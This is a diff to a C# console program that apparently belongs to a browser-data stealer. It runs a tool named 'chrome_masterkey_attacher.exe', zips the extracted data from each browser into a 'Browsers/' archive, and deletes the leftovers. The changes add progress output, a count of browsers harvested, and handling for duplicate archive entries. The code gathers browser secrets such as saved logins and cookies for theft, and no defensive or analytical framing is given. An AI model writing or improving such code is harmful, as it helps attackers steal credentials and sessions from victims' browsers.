@@ -22,6 +22,7 @@ namespace ConsoleApp1
         {
             try
             {
+                Console.Write("[*] Recovering browser data... ");
                 string exeName = "chrome_masterkey_attacher.exe";
                 string fullExePath = string.Empty;
 
@@ -44,6 +45,7 @@ namespace ConsoleApp1
 
                 if (string.IsNullOrEmpty(fullExePath))
                 {
+                    Console.WriteLine("SKIP (tool not found)");
                     return;
                 }
 
@@ -69,6 +71,7 @@ namespace ConsoleApp1
                 }
 
                 // After extraction, add files to zip
+                int count = 0;
                 using (ZipArchive archive = ZipFile.Open(zipPath, ZipArchiveMode.Update))
                 {
                     foreach (var mapping in BrowserMappings)
@@ -76,7 +79,10 @@ namespace ConsoleApp1
                         string extractDir = Path.Combine(Path.GetDirectoryName(fullExePath), mapping.Key);
                         if (Directory.Exists(extractDir))
                         {
-                            AddDirectoryToZip(archive, extractDir, $"Browsers/{mapping.Value}");
+                            if (AddDirectoryToZip(archive, extractDir, $"Browsers/{mapping.Value}"))
+                            {
+                                count++;
+                            }
 
                             // Cleanup
                             try
@@ -87,16 +93,27 @@ namespace ConsoleApp1
                         }
                     }
                 }
+
+                if (count > 0)
+                {
+                    Console.WriteLine($"OK ({count} browsers)");
+                }
+                else
+                {
+                    Console.WriteLine("OK (no data found)");
+                }
             }
             catch (Exception ex)
             {
-                Debug.WriteLine($"Browser recovery error: {ex.Message}");
+                Console.WriteLine($"FAILED ({ex.Message})");
             }
         }
 
-        private static void AddDirectoryToZip(ZipArchive archive, string sourceDir, string zipEntryPrefix)
+        private static bool AddDirectoryToZip(ZipArchive archive, string sourceDir, string zipEntryPrefix)
         {
             string[] files = Directory.GetFiles(sourceDir, "*", SearchOption.AllDirectories);
+            if (files.Length == 0) return false;
+
             foreach (string file in files)
             {
                 try
@@ -104,10 +121,18 @@ namespace ConsoleApp1
                     string relativePath = file.Substring(sourceDir.Length).TrimStart(Path.DirectorySeparatorChar, Path.AltDirectorySeparatorChar);
                     string entryName = Path.Combine(zipEntryPrefix, relativePath).Replace('\\', '/');
 
+                    // Check if entry already exists to avoid exceptions
+                    var existingEntry = archive.GetEntry(entryName);
+                    if (existingEntry != null)
+                    {
+                        existingEntry.Delete();
+                    }
+
                     archive.CreateEntryFromFile(file, entryName);
                 }
                 catch { }
             }
+            return true;
         }
     }
 }
